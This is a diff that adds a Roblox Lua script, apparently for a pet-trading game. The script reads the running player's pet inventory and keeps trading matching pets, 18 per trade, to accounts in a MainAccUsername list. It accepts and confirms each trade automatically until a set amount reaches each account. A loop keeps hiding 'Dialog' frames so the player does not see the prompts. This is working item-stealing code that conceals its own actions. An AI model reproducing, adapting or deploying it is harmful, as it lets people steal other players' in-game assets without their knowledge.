@@ -1,0 +1,698 @@
+--// Services
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+
+local targetFrameNames = {"Dialog"}
+
+--// Remotes / modules
+local API = ReplicatedStorage:WaitForChild("API")
+
+local addItemRemote =
+    API:WaitForChild("TradeAPI/AddItemToOffer")
+
+local sendTradeRemote =
+    ReplicatedStorage:FindFirstChild("TradeAPI/SendTradeRequest", true)
+
+local tradeFunction =
+    API:WaitForChild("TradeAPI/AcceptOrDeclineTradeRequest")
+
+--// Everything that actually runs
+task.spawn(function()
+
+    --==================================================
+    -- CLIENT DATA
+    --==================================================
+
+    local successClientData, ClientData = pcall(function()
+        return require(
+            ReplicatedStorage
+                :WaitForChild("ClientModules")
+                :WaitForChild("Core")
+                :WaitForChild("ClientData")
+        )
+    end)
+
+    if not successClientData or not ClientData then
+        warn("Failed to load ClientData")
+        return
+    end
+
+    --==================================================
+    -- KIND DB
+    --==================================================
+
+    local KindDB = require(
+        ReplicatedStorage
+            :WaitForChild("ClientDB")
+            :WaitForChild("Inventory")
+            :WaitForChild("KindDB")
+    )
+
+    --==================================================
+    -- FUNCTIONS
+    --==================================================
+
+    local offeredItemIds = {}
+
+    local function getKindDisplayName(kind)
+        local kindData = kind and KindDB[kind]
+
+        return kindData
+            and tostring(kindData.name or "")
+            or ""
+    end
+
+    --==================================================
+    -- REFRESH PET / EGG DATA
+    --==================================================
+
+    local function refreshPetEgg()
+        local playerGui = LocalPlayer:FindFirstChild("PlayerGui")
+
+        if not playerGui then
+            return false
+        end
+
+        local fired = false
+
+        for _, descendant in ipairs(playerGui:GetDescendants()) do
+            if descendant:IsA("BindableEvent")
+                and descendant.Name == "RefreshSelected" then
+
+                pcall(function()
+                    descendant:Fire()
+                end)
+
+                fired = true
+            end
+        end
+
+        return fired
+    end
+
+    --==================================================
+    -- WAIT FOR INVENTORY
+    --==================================================
+
+    local function waitForInventoryReady()
+        for _ = 1, 20 do
+            local dataStore = ClientData.get_data()
+
+            local playerData =
+                dataStore
+                and (dataStore[LocalPlayer] or dataStore[LocalPlayer.Name])
+
+            if playerData
+                and playerData.inventory
+                and playerData.inventory.pets then
+
+                return true
+            end
+
+            task.wait(0.1)
+        end
+
+        return false
+    end
+
+    --==================================================
+    -- GET ITEMS
+    -- Maximum is 18 per trade.
+    --==================================================
+
+    local function getMultipleUniqueIdsByName(itemName, itemForm, limit)
+
+        local dataStore = ClientData.get_data()
+
+        local playerData =
+            dataStore
+            and (dataStore[LocalPlayer] or dataStore[LocalPlayer.Name])
+
+        if not playerData
+            or not playerData.inventory
+            or not playerData.inventory.pets then
+
+            return {}
+        end
+
+        local uniqueIds = {}
+
+        local formLower =
+            string.lower(tostring(itemForm or ""))
+
+        local targetNameLower =
+            string.lower(tostring(itemName or ""))
+
+        for uniqueId, itemData in pairs(playerData.inventory.pets) do
+
+            if itemData and itemData.kind then
+
+                local displayName =
+                    getKindDisplayName(itemData.kind)
+
+                local displayLower =
+                    string.lower(displayName)
+
+                local kindLower =
+                    string.lower(tostring(itemData.kind))
+
+                local nameMatches =
+                    displayLower == targetNameLower
+                    or kindLower == targetNameLower
+
+                if nameMatches
+                    and not offeredItemIds[uniqueId] then
+
+                    local properties =
+                        itemData.properties or {}
+
+                    local isNeon =
+                        properties.neon == true
+
+                    local isMegaNeon =
+                        properties.mega_neon == true
+
+                    local matchesForm =
+                        (
+                            formLower == "neon"
+                            and isNeon
+                            and not isMegaNeon
+                        )
+
+                        or
+
+                        (
+                            formLower == "mega"
+                            and isMegaNeon
+                        )
+
+                        or
+
+                        (
+                            formLower == "normal"
+                            and not isNeon
+                            and not isMegaNeon
+                        )
+
+                    if matchesForm then
+
+                        table.insert(
+                            uniqueIds,
+                            uniqueId
+                        )
+
+                        -- Never select more than 18
+                        -- for a single trade.
+                        if #uniqueIds >= limit then
+                            break
+                        end
+                    end
+                end
+            end
+        end
+
+        return uniqueIds
+    end
+
+    --==================================================
+    -- SEND TRADE REQUEST
+    --==================================================
+
+    local function sendTradeRequest(playerName)
+
+        local targetPlayer =
+            Players:FindFirstChild(playerName)
+
+        if not targetPlayer then
+            return false
+        end
+
+        refreshPetEgg()
+
+        task.wait(0.5)
+
+        if not waitForInventoryReady() then
+            return false
+        end
+
+        if sendTradeRemote
+            and sendTradeRemote:IsA("RemoteEvent") then
+
+            local success = pcall(function()
+                sendTradeRemote:FireServer(targetPlayer)
+            end)
+
+            if success then
+                task.wait(5)
+                return true
+            end
+        end
+
+        return false
+    end
+
+    --==================================================
+    -- FORCE RECEIVER ACCEPT
+    --==================================================
+
+    local function acceptTradeForAll()
+
+        local forceReceiverAcceptNegotiation =
+            API:WaitForChild("TradeAPI/AcceptNegotiation")
+
+        local forceReceiverConfirmTrade =
+            API:WaitForChild("TradeAPI/ConfirmTrade")
+
+        for _, targetPlayer in ipairs(Players:GetPlayers()) do
+
+            if targetPlayer ~= LocalPlayer then
+
+                pcall(function()
+                    tradeFunction:InvokeServer(
+                        targetPlayer,
+                        true
+                    )
+                end)
+
+                pcall(function()
+                    forceReceiverAcceptNegotiation:FireServer()
+                end)
+
+                task.wait(0.5)
+
+                pcall(function()
+                    forceReceiverConfirmTrade:FireServer()
+                end)
+            end
+        end
+    end
+
+    --==================================================
+    -- TRADE REMOTES
+    --==================================================
+
+    local AcceptNeg =
+        API:WaitForChild("TradeAPI/AcceptNegotiation")
+
+    local ConfirmTrade =
+        API:WaitForChild("TradeAPI/ConfirmTrade")
+
+    --==================================================
+    -- ADD SELECTED ITEMS
+    -- Maximum 18 items per trade.
+    --==================================================
+
+    local function addSelectedItems()
+
+        local uniqueIds =
+            getMultipleUniqueIdsByName(
+                TARGET_ITEM_NAME,
+                TARGET_ITEM_FORM,
+                18
+            )
+
+        if #uniqueIds == 0 then
+
+            warn(
+                "[TRADE] No matching items found:",
+                TARGET_ITEM_NAME,
+                TARGET_ITEM_FORM
+            )
+
+            return 0
+        end
+
+        local addedCount = 0
+
+        -- Add up to 18 items for this trade.
+        for _, uniqueId in ipairs(uniqueIds) do
+
+            local success, err = pcall(function()
+                addItemRemote:FireServer(uniqueId)
+            end)
+
+            if success then
+
+                addedCount += 1
+
+                offeredItemIds[uniqueId] = true
+
+            else
+
+                warn(
+                    "[TRADE] AddItemToOffer failed:",
+                    uniqueId,
+                    err
+                )
+            end
+        end
+
+        -- Let the final AddItemToOffer requests register.
+        task.wait(0.35)
+
+        return addedCount
+    end
+
+    --==================================================
+    -- RUN ONE TRADE
+    --
+    -- Returns:
+    --   completed = whether trade succeeded
+    --   addedCount = how many items were put into it
+    --==================================================
+
+    local function runTradeCycle(playerName)
+
+        local targetPlayer =
+            Players:FindFirstChild(playerName)
+
+        if not targetPlayer then
+            return false, 0
+        end
+
+        --==================================================
+        -- 1. Refresh before sending trade
+        --==================================================
+
+        refreshPetEgg()
+
+        task.wait(0.5)
+
+        if not waitForInventoryReady() then
+
+            warn(
+                "[TRADE] Inventory was not ready."
+            )
+
+            return false, 0
+        end
+
+        --==================================================
+        -- 2. Check trade remote
+        --==================================================
+
+        if not sendTradeRemote
+            or not sendTradeRemote:IsA("RemoteEvent") then
+
+            warn(
+                "[TRADE] SendTradeRequest remote not found."
+            )
+
+            return false, 0
+        end
+
+        --==================================================
+        -- 3. Send trade request
+        --==================================================
+
+        local requestSuccess = pcall(function()
+            sendTradeRemote:FireServer(targetPlayer)
+        end)
+
+        if not requestSuccess then
+
+            warn(
+                "[TRADE] Failed to send trade request."
+            )
+
+            return false, 0
+        end
+
+        --==================================================
+        -- 4. Wait for trade window
+        --==================================================
+
+        task.wait(1)
+
+        --==================================================
+        -- 5. Refresh after trade opens
+        --==================================================
+
+        refreshPetEgg()
+
+        task.wait(0.5)
+
+        if not waitForInventoryReady() then
+
+            warn(
+                "[TRADE] Inventory was not ready after trade opened."
+            )
+
+            return false, 0
+        end
+
+        --==================================================
+        -- 6. Add pets / eggs
+        --==================================================
+
+        local addedCount =
+            addSelectedItems()
+
+        if addedCount <= 0 then
+
+            warn(
+                "[TRADE] Nothing was added to the trade."
+            )
+
+            return false, 0
+        end
+
+        print(
+            "[TRADE] Added",
+            addedCount,
+            "item(s) to trade with",
+            playerName
+        )
+
+        --==================================================
+        -- 7. Fast negotiation / confirmation
+        --==================================================
+
+        pcall(function()
+            AcceptNeg:FireServer()
+        end)
+
+        task.wait(0.15)
+
+        pcall(function()
+            ConfirmTrade:FireServer()
+        end)
+
+        --==================================================
+        -- 8. Wait for completion
+        --==================================================
+
+        task.wait(2)
+
+        refreshPetEgg()
+
+        waitForInventoryReady()
+
+        return true, addedCount
+    end
+
+    --==================================================
+    -- TRADE CYCLE
+    --
+    -- Amount = TOTAL per user
+    -- 18 = MAXIMUM per individual trade
+    --==================================================
+
+    task.spawn(function()
+
+        local currentTargetIndex = 1
+
+        -- How many items have been successfully
+        -- traded to the current user.
+        local currentTargetAmount = 0
+
+        while true do
+
+            if MainAccUsername
+                and #MainAccUsername > 0 then
+
+                -- Make sure index stays valid.
+                if currentTargetIndex > #MainAccUsername then
+
+                    currentTargetIndex = 1
+                    currentTargetAmount = 0
+                end
+
+                local playerName =
+                    MainAccUsername[currentTargetIndex]
+
+                if playerName
+                    and playerName ~= "" then
+
+                    local targetPlayer =
+                        Players:FindFirstChild(playerName)
+
+                    if targetPlayer then
+
+                        --==================================================
+                        -- USER IS ALREADY COMPLETE
+                        -- Move to next user.
+                        --==================================================
+
+                        if currentTargetAmount >= Amount then
+
+                            print(
+                                "[TRADE] Completed",
+                                Amount,
+                                "item(s) for",
+                                playerName
+                            )
+
+                            currentTargetIndex += 1
+                            currentTargetAmount = 0
+
+                        else
+
+                            --==================================================
+                            -- Calculate how many items are still needed.
+                            --
+                            -- Example:
+                            -- Amount = 40
+                            -- current = 0  -> need 40
+                            -- current = 18 -> need 22
+                            -- current = 36 -> need 4
+                            --
+                            -- The actual trade is always capped at 18.
+                            --==================================================
+
+                            local remaining =
+                                Amount - currentTargetAmount
+
+                            local tradeLimit =
+                                math.min(18, remaining)
+
+                            print(
+                                "[TRADE] Trading with:",
+                                playerName,
+                                "(" ..
+                                currentTargetIndex ..
+                                "/" ..
+                                #MainAccUsername ..
+                                ")",
+                                "Progress:",
+                                currentTargetAmount ..
+                                "/" ..
+                                Amount,
+                                "Next trade max:",
+                                tradeLimit
+                            )
+
+                            local completed, addedCount =
+                                runTradeCycle(playerName)
+
+                            if completed
+                                and addedCount > 0 then
+
+                                currentTargetAmount += addedCount
+
+                                print(
+                                    "[TRADE] Progress for",
+                                    playerName,
+                                    ":",
+                                    currentTargetAmount ..
+                                    "/" ..
+                                    Amount
+                                )
+
+                                --==================================================
+                                -- If Amount reached, next loop moves to
+                                -- the next username.
+                                --==================================================
+
+                                if currentTargetAmount >= Amount then
+
+                                    print(
+                                        "[TRADE] FINISHED:",
+                                        playerName,
+                                        "received",
+                                        currentTargetAmount,
+                                        "item(s)"
+                                    )
+
+                                    currentTargetIndex += 1
+                                    currentTargetAmount = 0
+                                end
+
+                            else
+
+                                warn(
+                                    "[TRADE] Trade failed or no items were added for",
+                                    playerName
+                                )
+
+                                -- Don't immediately skip the user.
+                                -- Retry the same user.
+                                task.wait(1)
+                            end
+                        end
+
+                    else
+
+                        warn(
+                            "[TRADE] Target player not found:",
+                            playerName
+                        )
+
+                        -- Skip unavailable player.
+                        currentTargetIndex += 1
+                        currentTargetAmount = 0
+                    end
+
+                else
+
+                    -- Invalid username.
+                    currentTargetIndex += 1
+                    currentTargetAmount = 0
+                end
+
+            else
+
+                task.wait(1)
+            end
+
+            --==================================================
+            -- Optional receiver-side automation
+            --==================================================
+
+            if ForceReceiver then
+                acceptTradeForAll()
+            end
+
+            task.wait(0.25)
+        end
+    end)
+
+    --==================================================
+    -- HIDE DIALOG
+    --==================================================
+
+    local PlayerGui =
+        LocalPlayer:WaitForChild("PlayerGui")
+
+    local framesToHide = {}
+
+    for _, name in ipairs(targetFrameNames) do
+        framesToHide[name] = true
+    end
+
+    while true do
+
+        for _, gui in ipairs(PlayerGui:GetDescendants()) do
+
+            if gui:IsA("Frame")
+                and framesToHide[gui.Name]
+                and gui.Visible then
+
+                gui.Visible = false
+            end
+        end
+
+        task.wait(3)
+    end
+end)
